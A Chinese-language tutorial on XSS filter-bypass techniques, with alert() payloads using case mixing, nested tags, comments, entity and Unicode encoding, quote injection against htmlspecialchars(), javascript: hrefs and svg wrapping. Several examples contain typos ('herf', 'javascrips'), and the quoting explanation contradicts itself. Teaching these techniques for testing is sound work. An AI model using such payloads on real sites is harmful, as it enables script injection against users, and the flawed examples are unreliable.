<a name="oKStr"></a>
## XSS之绕过技巧
大多数网站为了避免XSS的攻击，对于攻击者的输入都采取了过滤的措施，导致攻击者通常不能正常插入恶意代码来达到攻击目的。但是仍存在一些漏洞可以利用，来绕过过滤措施。<br />XSS绕过的方法有许多，主要取决于攻击者的思路和对前端技术的掌握，以下介绍几个简单的绕过方法。
<a name="q70QZ"></a>
### 1）对前端的输入字符数量限制
可以尝试进行抓包重发或者修改前端的HTML中的长度限制。
<a name="oR1b2"></a>
### 2）后台对输入的内容进行正则匹配来过滤输入
对于这样的过滤可以考虑大小写混合输入的方法。
```
payload:<sCRipT>alert('你打篮球像boy')</sCrIPt>
```
<a name="GhI8w"></a>
### 3）后台对输入的内容进行替换
采用拼拼凑的输入方法。
```
payload：<sc<script>ript>alert('你打篮球像boy')</scr<script>ipt>
```
<a name="XbVjY"></a>
### 4）使用注释来干扰后台对输入内容的识别。
```
payload:<sc<!--test-->ript>alert('你打篮球像boy')</scr<!--tshauie-->ipt>
```
<a name="YYiFx"></a>
### 5）编码
思路：后台有可能会对代码中的关键字进行过滤，但可以尝试将关键字进行编码后在插入。（注意：编码在输出时是否会被正常识别和翻译才是关键，不是所有的编码都是可以的）<br />例1：一次编码案例
```html
#使用事件属性onerror()的原始payload: 
<img src=# onerror=alert('yangshuang')"/>

#使用HTML_ENTITY编码后的payload：
<a src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#121;&#97;&#110;&#103;&#115;&#104;&#117;&#97;&#110;&#103;&#39;&#41;"/>
```
例2：多次编码案例解析如下编码
```html
#原始payload

<a herf="javascrips:alert(XSS)">  </a>
#使用unicode的UTF-16编码alert这个字符
<a herf="javascrips:\u0061\u006C\u0065\u0072\u0074(XSS)">  </a>
#再用url编码alert的中间结果
<a herf="javascrips:%5Cu0061%5Cu006C%5Cu0065%5Cu0072%5Cu0074(XSS)">  </a>
#最后用html实体编码，再编码整个payload
太长了，略
```
<a name="vgIJ4"></a>
### 6）`htmlspecialchars()`函数绕过
```
#该函数的语法：
htmlspecialchars(string,flags,character-set,double_encode)
#可用的quotestyle类型：
ENT_COMPAT - 默认。仅编码双引号
ENT_QUOTES - 编码双引号和单引号
ENT_NOQUOTES - 不编码任何引号
#预定义的字符是：
& (和号)   成为 &amp         
" (双引号) 成为 &quot           
’ (单引号) 成为 &#039                     
< (小于)   成为 &lt                    
> (大于)   成为 &gt
```
过滤原理：`htmlspecialchars()` 函数把预定义的字符转换为 HTML 实体，从而使XSS攻击失效。但是这个函数默认配置不会将单引号和双引号过滤，只有设置了`quotestyle`规定如何编码单引号和双引号才能会过滤掉单引号
```
# 默认配置下，可使用以下语句绕过：
q' onclick='alert(111)'
```
<a name="Mc7Vs"></a>
### 7） href 绕过
当输入的值在 a 标签 herf 里
```
payload:javascript:alert(1111)
```
直接代入 a 标签 herf 里面，一样可以绕过 `htmlspecialchars()`函数
<a name="GSfur"></a>
### 8）XSS之js输出绕过
当目标是用JavaScript脚本输出的，只需闭合原有的表情即可插入代码
```
payload:<script> $ms='          11111111'</script><script>alert(1111)</script> ;
```
<a name="RHokH"></a>
### 9）标签绕过
当输入`<script>alert(XSS);</script>`没有反应的时候，可以在前边加上`<svg>`
```html
<svg><script>alert(XSS);</script>
```
当浏览器解析到`<svg>`标签时，浏览器就开始使用一套新的标准开始解析后面的内容，直到碰到闭合标签。而在这一套新的标准遵循XML解析规则，在XML中实体编码会自动转义，重新来一遍标签开启状态，此时就会执行XSS了。
